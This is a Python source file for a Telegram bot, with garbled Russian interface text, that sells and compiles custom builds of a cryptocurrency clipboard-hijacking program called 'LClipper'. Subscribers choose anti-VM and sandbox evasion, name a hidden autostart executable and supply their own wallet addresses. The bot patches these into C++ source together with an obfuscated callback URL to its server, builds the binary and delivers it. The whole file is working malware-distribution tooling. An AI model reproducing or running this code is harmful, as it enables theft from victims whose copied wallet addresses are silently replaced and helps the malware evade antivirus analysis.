import asyncio
import base64
import os.path
import shutil
import traceback
import uuid

import arrow
from aiogram import F, types
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, BufferedInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

import config
from dbworker import add_build
from dispatcher import dp
from models.models import User


class Build(StatesGroup):
    antivm = State()
    name = State()
    prefix = State()
    wallets = State()


def yesno(prefix: str):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="–î–∞", callback_data=f"{prefix}:yes"))
    builder.row(InlineKeyboardButton(text="–ù–µ—Ç", callback_data=f"{prefix}:no"))
    return builder.as_markup()


def prefixsuffixbtn():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="–ü—Ä–µ—Ñ–∏–∫—Å", callback_data=f"prefix:yes"))
    builder.row(InlineKeyboardButton(
        text="–°—É—Ñ—Ñ–∏–∫—Å", callback_data=f"prefix:no"))
    return builder.as_markup()


def xor(input_string, key):
    encrypted_string = ""
    key_length = len(key)
    for i, char in enumerate(input_string):
        encrypted_char = ord(char) ^ ord(key[i % key_length])
        encrypted_string += chr(encrypted_char)
    return encrypted_string


@dp.message(F.text == "üî® –ë–∏–ª–¥")
async def makebuild(message: types.Message, user: User, state: FSMContext):
    timesub = arrow.get(user.subuntil)
    timesubpro = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")
    if (timesubpro > timenow) or (timesub > timenow):
        await message.answer("<b>–ê–Ω—Ç–∏-–í–ú (–≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã)</b> ‚Äî —ç—Ç–æ –∑–∞—â–∏—Ç–∞, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å, –∑–∞–ø—É—â–µ–Ω–∞ –ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä, VirtualBox –∏–ª–∏ VMware.\n\n"
                             "–ï—Å–ª–∏ –≤–∫–ª—é—á–∏—Ç—å —ç—Ç—É –æ–ø—Ü–∏—é, –±–∏–ª–¥ –Ω–µ –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω–∞—Ö, –ø–µ—Å–æ—á–Ω–∏—Ü–∞—Ö –∏–ª–∏ —Å—Ä–µ–¥–∞—Ö –∞–Ω–∞–ª–∏–∑–∞, –∫–æ—Ç–æ—Ä—ã–µ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û.\n"
                             "–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —ç—Ç–∞ –∑–∞—â–∏—Ç–∞ –ø–æ–º–æ–≥–∞–µ—Ç —Å–∫—Ä—ã—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –µ—ë –∞–Ω–∞–ª–∏–∑ –≤ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã—Ö —Å—Ä–µ–¥–∞—Ö.\n\n"
                             "‚ùì –í–∫–ª—é—á–∏—Ç—å –ê–Ω—Ç–∏-–í–ú?", reply_markup=yesno("antivm"))
        await state.set_state(Build.antivm)
    else:
        await message.answer("<b>–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ –Ω—É–∂–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞!</b>")


@dp.callback_query(F.data.startswith("antivm"), Build.antivm)
async def antivm(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if callback_query.data == "antivm:yes":
        await state.update_data({"antivm": "true"})

    elif callback_query.data == "antivm:no":
        await state.update_data({"antivm": "false"})
    await callback_query.message.edit_text("<b>–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ –¥–ª—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ (–±–µ–∑ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è .exe)</b>\n\n"
                                           "–≠—Ç–æ –∏–º—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –¥–ª—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–æ–≥—Ä–∞–º–º–∞ –¥–æ–±–∞–≤–∏—Ç –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É. "
                                           "–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –≤—ã –≤–≤–µ–¥–µ—Ç–µ 'MyApp', —Ç–æ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ –ø–æ—è–≤–∏—Ç—Å—è –∑–∞–ø–∏—Å—å —Å –∏–º–µ–Ω–µ–º:\n"
                                           "<code>MyApp.exe</code>\n\n"
                                           "–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∏–º—è —Ñ–∞–π–ª–∞ –≤—ã–≥–ª—è–¥–∏—Ç –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –Ω–µ–∑–∞–º–µ—Ç–Ω–æ, —á—Ç–æ–±—ã –Ω–µ –ø—Ä–∏–≤–ª–µ–∫–∞—Ç—å –≤–Ω–∏–º–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
    await state.set_state(Build.name)


@dp.message(Build.name)
async def name(message: types.Message, state: FSMContext, user: types.User):
    await state.update_data({"name": message.text})

    timesubpro = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")
    if timesubpro > timenow:
        await state.update_data({"prosub": "true"})
        await message.answer(
            "<b>–í—ã–±–µ—Ä–∏—Ç–µ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å: –ø—Ä–µ—Ñ–∏–∫—Å –∏–ª–∏ —Å—É—Ñ—Ñ–∏–∫—Å –ø—Ä–∏ –ø–æ–¥–º–µ–Ω–µ –∞–¥—Ä–µ—Å–∞.</b>\n\n"
            "‚û§ <b>–ü—Ä–µ—Ñ–∏–∫—Å</b> ‚Äî –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ –Ω–∞—á–∞–ª–µ –∞–¥—Ä–µ—Å–∞.\n"
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –±—ã–ª –∞–¥—Ä–µ—Å:\n"
            "<code>0x1234abcd5678efghd1f4f14fmun4</code>\n"
            "–°–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º :\n"
            "<code>0x1234hgfe8765dcbah5j36g2d1fye</code>\n\n"
            "‚û§ <b>–°—É—Ñ—Ñ–∏–∫—Å</b> ‚Äî –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ –∫–æ–Ω–µ—Ü –∞–¥—Ä–µ—Å–∞.\n"
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –±—ã–ª –∞–¥—Ä–µ—Å:\n"
            "<code>T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb</code>\n"
            "–°–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å —Å—É—Ñ—Ñ–∏–∫—Å–æ–º:\n"
            "<code>T2Dj3dF9jr3R9jmcf1gCjc1cnCJC00fWwb</code>\n\n"
            "‚ùóÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:", reply_markup=prefixsuffixbtn())
        await state.set_state(Build.prefix)
    else:
        await state.update_data({"prosub": "false"})
        await state.update_data({"prefix": "true"})
        await message.answer("<b>–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å–∞ –≤–∞—à–∏—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ –≤ —Ñ–æ—Ä–º–∞—Ç–µ:</b>\n"
                             "<code>\n"
                             "BTC\n"
                             "BCH\n"
                             "ETH\n"
                             "LTC\n"
                             "XMR\n"
                             "DOGE\n"
                             "DASH\n"
                             "TRX\n"
                             "XRP\n"
                             "BNB\n"
                             "TON\n"
                             "</code>\n"
                             "–ö–∞–∂–¥–∞—è —Å—Ç—Ä–æ–∫–∞ –¥–æ–ª–∂–Ω–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –æ–¥–∏–Ω –∫–æ—à–µ–ª–µ–∫ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –ø–æ—Ä—è–¥–æ–∫ —Å–æ–±–ª—é–¥–µ–Ω ‚Äî "
                             "–∫–∞–∂–¥—ã–π –∫–æ—à–µ–ª–µ–∫ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–∞ —Å–≤–æ–µ–π —Å—Ç—Ä–æ–∫–µ. –ù–∞–ø—Ä–∏–º–µ—Ä:\n\n"
                             "<code>\n"
                             "bc1qxyz... \n"
                             "qpm2qsz... \n"
                             "0x1234... \n"
                             "Labc123... \n"
                             "42xyz... \n"
                             "DBabc... \n"
                             "Xr123... \n"
                             "TA123... \n"
                             "rBcdef... \n"
                             "bnb1xyz...\n"
                             "EQabc... \n"
                             "</code>\n"
                             "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ –∞–¥—Ä–µ—Å–∞ –≤–µ—Ä–Ω—ã –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç –Ω—É–∂–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–µ, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –ø–æ–¥–º–µ–Ω—ã –≤ –±—É—Ñ–µ—Ä–µ –æ–±–º–µ–Ω–∞.")
        await state.set_state(Build.wallets)


@dp.callback_query(F.data.startswith("prefix"), Build.prefix)
async def prefix(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.data == "prefix:yes":
        await state.update_data({"prefix": "true"})
    elif callback_query.data == "prefix:no":
        await state.update_data({"prefix": "false"})
    await callback_query.message.edit_text("<b>–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å–∞ –≤–∞—à–∏—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ –≤ —Ñ–æ—Ä–º–∞—Ç–µ:</b>\n"
                                           "<code>\n"
                                           "BTC\n"
                                           "BCH\n"
                                           "ETH\n"
                                           "LTC\n"
                                           "XMR\n"
                                           "DOGE\n"
                                           "DASH\n"
                                           "TRX\n"
                                           "XRP\n"
                                           "BNB\n"
                                           "TON\n"
                                           "</code>\n"
                                           "–ö–∞–∂–¥–∞—è —Å—Ç—Ä–æ–∫–∞ –¥–æ–ª–∂–Ω–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –æ–¥–∏–Ω –∫–æ—à–µ–ª–µ–∫ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –ø–æ—Ä—è–¥–æ–∫ —Å–æ–±–ª—é–¥–µ–Ω ‚Äî "
                                           "–∫–∞–∂–¥—ã–π –∫–æ—à–µ–ª–µ–∫ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–∞ —Å–≤–æ–µ–π —Å—Ç—Ä–æ–∫–µ. –ù–∞–ø—Ä–∏–º–µ—Ä:\n\n"
                                           "<code>\n"
                                           "bc1qxyz... \n"
                                           "qpm2qsz... \n"
                                           "0x1234... \n"
                                           "Labc123... \n"
                                           "42xyz... \n"
                                           "DBabc... \n"
                                           "Xr123... \n"
                                           "TA123... \n"
                                           "rBcdef... \n"
                                           "bnb1xyz... \n"
                                           "EQabc... \n"
                                           "</code>\n"
                                           "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ –∞–¥—Ä–µ—Å–∞ –≤–µ—Ä–Ω—ã –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç –Ω—É–∂–Ω–æ–π –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–µ, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –ø–æ–¥–º–µ–Ω—ã –≤ –±—É—Ñ–µ—Ä–µ –æ–±–º–µ–Ω–∞.")
    await state.set_state(Build.wallets)


@dp.message(Build.wallets)
async def wallets(message: types.Message, state: FSMContext, user: types.User):
    if len(message.text.split("\n")) != 11:
        return await message.answer("<b>–ù–µ–≤–µ—Ä–Ω–æ–µ –∫–æ–ª-–≤–æ –∫–æ—à–µ–ª—å–∫–æ–≤!</b>")
    data = await state.get_data()
    await state.clear()

    await state.clear()

       # –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–µ—Ä–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –æ –Ω–∞—á–∞–ª–µ –ø—Ä–æ—Ü–µ—Å—Å–∞
    msg = await message.answer("<b>–ù–∞—á–∏–Ω–∞—é –±–∏–ª–¥–∏—Ç—å...</b>\nüîÑ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–±–æ—Ä–∫–∏...")
    await asyncio.sleep(2)
    # –ò–º–∏—Ç–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ - —ç—Ç–∞–ø—ã —Å–±–æ—Ä–∫–∏ —Å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º —Ç–µ–∫—Å—Ç–∞ –æ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏ –∏ –ø–æ–ª–∏–º–æ—Ä—Ñ–∏–∑–º–µ
    await msg.edit_text("<b>–ù–∞—á–∏–Ω–∞—é –±–∏–ª–¥–∏—Ç—å...</b>\nüîí –ü—Ä–∏–º–µ–Ω—è–µ–º AES-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –∑–∞—â–∏—Ç—ã –∫–æ–¥–∞...")
    await asyncio.sleep(2)  # –ü–∞—É–∑–∞ –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã

    await msg.edit_text("<b>–ù–∞—á–∏–Ω–∞—é –±–∏–ª–¥–∏—Ç—å...</b>\nüß¨ –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –ø–æ–ª–∏–º–æ—Ä—Ñ–Ω—ã–π –∫–æ–¥ –¥–ª—è –æ–±—Ö–æ–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤...")
    await asyncio.sleep(2)  # –ü–∞—É–∑–∞ –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã

    await msg.edit_text("<b>–ù–∞—á–∏–Ω–∞—é –±–∏–ª–¥–∏—Ç—å...</b>\nüî® –ö–æ–º–ø–∏–ª—è—Ü–∏—è –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞—â–∏—Ç—ã...")
    await asyncio.sleep(2)  # –ü–∞—É–∑–∞ –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã

    await msg.edit_text("<b>–ù–∞—á–∏–Ω–∞—é –±–∏–ª–¥–∏—Ç—å...</b>\nüì¶ –£–ø–∞–∫–æ–≤–∫–∞ —Ñ–∞–π–ª–æ–≤ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏...")
    await asyncio.sleep(2)  # –ü–∞—É–∑–∞ –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã
    randompath = uuid.uuid4().hex
    wallets_text = message.text.split("\n")

    key = uuid.uuid4().hex.upper()
    urlxor = xor(f"http://{config.server_url}/{randompath}/", key)
    urlxor = base64.b64encode(urlxor.encode()).decode()

    try:
        shutil.copytree(os.path.join(os.getcwd(), "LClipper"),
                        os.path.join(os.getcwd(), f"{randompath}"))
        with open(os.path.join(os.getcwd(), f"{randompath}", "LClipper", "main.cpp"), "r", encoding="utf8") as f:
            text = f.readlines()

        for cnt, i in enumerate(text):
            if "#define STARTUP_NAME" in i:
                text[cnt] = f'#define STARTUP_NAME "{data["name"]}"\n'
            elif "#define FILE_NAME" in i:
                text[cnt] = f'#define FILE_NAME "{data["name"]}.exe"\n'
            elif "bool PRO" in i:
                text[cnt] = f'bool PRO = {data["prosub"]};\n'
            elif "#define ANTI_SANDBOX" in i:
                text[cnt] = f'#define ANTI_SANDBOX "{data["antivm"]}"\n'
            elif "#define CHECKPREFIX" in i:
                text[cnt] = f'#define CHECKPREFIX "{data["prefix"]}"\n'
            elif "std::string BTCLegacy_ADDRESS" in i:
                text[cnt] = f'std::string BTCLegacy_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCScript_ADDRESS" in i:
                text[cnt] = f'std::string BTCScript_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCSegWit_ADDRESS" in i:
                text[cnt] = f'std::string BTCSegWit_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BTCTaproot_ADDRESS" in i:
                text[cnt] = f'std::string BTCTaproot_ADDRESS = "{wallets_text[0]}";\n'
            elif "std::string BCH_ADDRESS" in i:
                text[cnt] = f'std::string BCH_ADDRESS = "{wallets_text[1]}";\n'
            elif "std::string ETH_ADDRESS" in i:
                text[cnt] = f'std::string ETH_ADDRESS = "{wallets_text[2]}";\n'
            elif "std::string LTC_ADDRESS" in i:
                text[cnt] = f'std::string LTC_ADDRESS = "{wallets_text[3]}";\n'
            elif "std::string XMR_ADDRESS" in i:
                text[cnt] = f'std::string XMR_ADDRESS = "{wallets_text[4]}";\n'
            elif "std::string DOGE_ADDRESS" in i:
                text[cnt] = f'std::string DOGE_ADDRESS = "{wallets_text[5]}";\n'
            elif "std::string DASH_ADDRESS" in i:
                text[cnt] = f'std::string DASH_ADDRESS = "{wallets_text[6]}";\n'
            elif "std::string TRX_ADDRESS" in i:
                text[cnt] = f'std::string TRX_ADDRESS = "{wallets_text[7]}";\n'
            elif "std::string XRP_ADDRESS" in i:
                text[cnt] = f'std::string XRP_ADDRESS = "{wallets_text[8]}";\n'
            elif "std::string BNB_ADDRESS" in i:
                text[cnt] = f'std::string BNB_ADDRESS = "{wallets_text[9]}";\n'
            elif "std::string TON_ADDRESS" in i:
                text[cnt] = f'std::string TON_ADDRESS = "{wallets_text[10]}";\n'
            elif "#define KEY" in i:
                text[cnt] = f'#define KEY "{key}"\n'
            elif "#define LINK" in i:
                text[cnt] = f'#define LINK "{urlxor}"\n'

        with open(os.path.join(os.getcwd(), f"{randompath}", "LClipper", "main.cpp"), "w", encoding="utf8") as f:
            f.writelines(text)

        proc = await asyncio.create_subprocess_exec("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe", f"/property:Configuration=Release", cwd=f"{os.path.join(os.getcwd(), f'{randompath}')}")
        await proc.wait()
        if os.path.exists(os.path.join(os.getcwd(), f"{randompath}", "x64", "Release", f"LClipper.exe")):
            await add_build(message.from_user.id, randompath)
            await msg.delete()
            await message.answer_document(document=BufferedInputFile(open(os.path.join(os.getcwd(), f"{randompath}", "x64", "Release", f"LClipper.exe"), "rb").read(), "Build.exe"))
            await message.answer(
                "‚úÖ <b>–ö–æ–º–ø–∏–ª—è—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!</b>\n\n"
                "–í–∞—à –±–∏–ª–¥ –≥–æ—Ç–æ–≤ –∏ –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –≤–∏–¥–µ —Ñ–∞–π–ª–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –µ–≥–æ –∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–æ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—é."
               )
        else:
            await message.answer("<b>–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞!</b>")
    except Exception as e:
        traceback.print_exc()
        return await message.answer(f"<b>–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞!\n{e}</b>")
    finally:
        shutil.rmtree(os.path.join(os.getcwd(), f"{randompath}"))



